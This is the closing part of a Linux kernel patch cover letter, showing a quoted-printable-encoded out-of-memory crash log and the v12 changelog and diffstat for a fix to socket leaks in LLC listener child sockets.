[1665.707918][T10284] ? dump_header (arch/x86/include/asm/atomic64_64.h:15 =
include/linux/atomic/atomic-arch-fallback.h:2583 include/linux/atomic/atomi=
c-long.h:38 include/linux/atomic/atomic-instrumented.h:3189 include/linux/v=
mstat.h:196 include/linux/vmstat.h:208 mm/oom_kill.c:183 mm/oom_kill.c:473)=
=20

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:288)=20

[1665.708678][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.709132][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.709616][T10284] ? out_of_memory (mm/oom_kill.c:1158 (discriminator 1)=
)=20

[1665.710024][T10284] out_of_memory (mm/oom_kill.c:1158 (discriminator 1))=
=20

[1665.710435][T10284] ? __pfx_out_of_memory (mm/oom_kill.c:1114)=20

[1665.710868][T10284] ? lock_acquire+0x2f/0xb0=20

[1665.711243][T10284] ? __alloc_pages_noprof (mm/page_alloc.c:4188 mm/page_=
alloc.c:4478 mm/page_alloc.c:4839)=20

[1665.711712][T10284] __alloc_pages_noprof (include/linux/vmstat.h:236 (dis=
criminator 1) mm/page_alloc.c:4201 (discriminator 1) mm/page_alloc.c:4478 (=
discriminator 1) mm/page_alloc.c:4839 (discriminator 1))=20

[1665.712184][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.712658][T10284] ? hlock_class+0x4e/0x130=20

[1665.713041][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.713501][T10284] ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4792)=20

[1665.713991][T10284] ? __pfx___lock_acquire+0x10/0x10=20

[1665.714431][T10284] ? __sanitizer_cov_trace_switch+0x54/0x90=20

[1665.714917][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.715381][T10284] ? policy_nodemask (mm/mempolicy.c:1865 (discriminator=
 1) mm/mempolicy.c:2066 (discriminator 1))=20

[1665.715788][T10284] alloc_pages_mpol_noprof (include/linux/mm.h:1637)=20

[1665.716246][T10284] ? __pfx_alloc_pages_mpol_noprof (mm/mempolicy.c:2227)=
=20

[1665.716734][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.717194][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.717656][T10284] ? xas_load (lib/xarray.c:243)=20

[1665.718005][T10284] ? filemap_get_entry (mm/filemap.c:1850)=20

[1665.718439][T10284] folio_alloc_noprof (include/linux/instrumented.h:68 i=
nclude/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-=
flags.h:829 include/linux/page-flags.h:850 mm/internal.h:703 mm/internal.h:=
699 mm/mempolicy.c:2356)=20

[1665.718847][T10284] filemap_alloc_folio_noprof (mm/filemap.c:1511)=20

[1665.719316][T10284] ? __pfx_filemap_alloc_folio_noprof (mm/filemap.c:996)=
=20

[1665.719803][T10284] ? filemap_fault (include/linux/instrumented.h:68 incl=
ude/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-fla=
gs.h:562 mm/filemap.c:3241 mm/filemap.c:3342)=20

[1665.720231][T10284] __filemap_get_folio (mm/filemap.c:3818)=20

[1665.720683][T10284] filemap_fault (mm/internal.h:1002 mm/filemap.c:3242 m=
m/filemap.c:3342)=20

[1665.721097][T10284] ? __pfx_filemap_fault (mm/filemap.c:3315)=20

[1665.721534][T10284] ? do_pte_missing+0x165a/0x3ff0=20

[1665.721944][T10284] ? __pfx_lock_release+0x10/0x10=20

[1665.722375][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)=20

[1665.722813][T10284] __do_fault (mm/memory.c:4887)=20

[1665.723172][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)=20

[1665.723621][T10284] do_pte_missing+0x174c/0x3ff0=20

[1665.724026][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.724482][T10284] ? reacquire_held_locks+0x20b/0x4c0=20

[1665.724932][T10284] ? lock_vma_under_rcu (include/linux/mm.h:718 (discrim=
inator 2) mm/memory.c:6266 (discriminator 2))=20

[1665.725374][T10284] __handle_mm_fault (mm/memory.c:4791 mm/memory.c:3963 =
mm/memory.c:5789 mm/memory.c:5932)=20

[1665.725805][T10284] ? __pfx_lock_release+0x10/0x10=20

[1665.726207][T10284] ? down_read_trylock (kernel/locking/rwsem.c:1604)=20

[1665.726640][T10284] ? __pfx___handle_mm_fault (mm/memory.c:5841)=20

[1665.727085][T10284] ? __pfx_down_read_trylock (kernel/locking/rwsem.c:156=
2)=20

[1665.727574][T10284] ? __pfx_lock_vma_under_rcu (mm/memory.c:6256)=20

[1665.728053][T10284] handle_mm_fault (mm/memory.c:2943)=20

[1665.728479][T10284] do_user_addr_fault (arch/x86/mm/fault.c:441 arch/x86/=
mm/fault.c:1230)=20

[1665.728921][T10284] exc_page_fault (arch/x86/include/asm/irqflags.h:37 ar=
ch/x86/include/asm/irqflags.h:114 arch/x86/mm/fault.c:1485 arch/x86/mm/faul=
t.c:1534)=20

[1665.729305][T10284] asm_exc_page_fault (arch/x86/include/asm/idtentry.h:6=
23)=20

[ 1665.729700][T10284] RIP: 0033:0x559e433ce5cb

[ 1665.730065][T10284] Code: Unable to access opcode bytes at 0x559e433ce5a=
1.

Code starting with the faulting instruction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[ 1665.730594][T10284] RSP: 002b:00007ffcc17c93f0 EFLAGS: 00010206

[ 1665.731148][T10284] RAX: 000000000000003c RBX: 00007ffcc17c9418 RCX: 000=
0559e433d10c6

[ 1665.731733][T10284] RDX: 000000000000002c RSI: 0000559e433d10c0 RDI: 000=
0000000000004

[ 1665.732318][T10284] RBP: 00007ffcc17c9412 R08: 00007ffcc17c9420 R09: 000=
0000000000014

[ 1665.732904][T10284] R10: 0000000000000000 R11: 0000000000000202 R12: 000=
0559e433d10c6

[ 1665.733491][T10284] R13: d288ce703afb7e91 R14: 0000000000019194 R15: 000=
0000000000004

[ 1665.734120][T10284]  </TASK>

[ 1665.735174][T10284] Kernel Offset: disabled

[ 1665.735576][T10284] Rebooting in 86400 seconds..
-----END crash log-----=0D
=0D
Best regards,=0D
Zihan Xi=0D
=0D
Changes in v12

- Order llc_conn_handler() locals in reverse Christmas tree order.=0D
- Create children only for SABME; answer DISC and other P=3D1 commands
  from the listener.
- Drop ownerless deferred SABMEs if the listener leaves TCP_LISTEN
  before backlog drain.
- Hold skb->dev while queued; account indications and release
  unaccepted children on failure and teardown.
- Previous version:
  https://lore.kernel.org/all/cover.1790062133.git.zihanx@nebusec.ai/

Zihan Xi (1):
  llc: fix listener child socket leaks

 net/llc/llc_conn.c | 175 +++++++++++++++++++++++++++++++++++++++++----
 1 file changed, 163 insertions(+), 12 deletions(-)

--=20
2.43.0

